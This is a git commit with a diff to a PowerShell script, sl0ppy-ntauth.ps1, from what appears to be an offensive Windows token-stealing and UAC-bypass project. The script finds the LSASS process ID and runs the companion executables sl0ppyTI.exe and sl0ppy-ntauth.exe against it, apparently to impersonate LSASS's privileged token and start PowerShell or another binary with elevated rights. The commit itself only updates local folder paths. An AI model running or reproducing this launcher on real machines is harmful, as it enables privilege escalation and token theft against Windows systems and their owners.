3af24780527f65557103eebce7f7fda0b3191bfa
Patrick x0xr00t Hoogeveen <25748471+x0xr00t@users.noreply.github.com>
2022-12-06 12:58:49 -0800

    Update sl0ppy-ntauth.ps1

--- sl0ppy-ntauth.ps1
+++ sl0ppy-ntauth.ps1
@@ -10,7 +10,7 @@ Write-Host " {sl0p}Lsass Impersonation{sl0p}"
 Write-Host " {sl0p}----sl0ppyr00t----{sl0p}"
 Write-Host ""
 Write-Host ""
-cd -Path 'C:\Users\x0\Desktop\Multi-UAC-Bypass-windows-Poc\sl0ppy-TokenStealer' -PassThru
+cd -Path 'C:\Users\x0\Desktop\sl0ppy-ALPI\sl0ppy-TokenStealer' -PassThru
 Write-Host ""
 Write-Host ""
 $i = get-process lsass |select -expand id 
@@ -18,5 +18,5 @@ $i = get-process lsass |select -expand id
 powershell ./sl0ppyTI.exe pid:$i binary:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 sleep 5 
 $i = get-process lsass |select -expand id
-powershell ./sl0ppy-ntauth.exe pid:$i binary:C:\Users\x0\Desktop\Multi-UAC-Bypass-windows-Poc\sl0ppy-ntc.exe 
+powershell ./sl0ppy-ntauth.exe pid:$i binary:C:\Users\x0\Desktop\sl0ppy-ALPI\sl0ppy-ntc.exe 
 
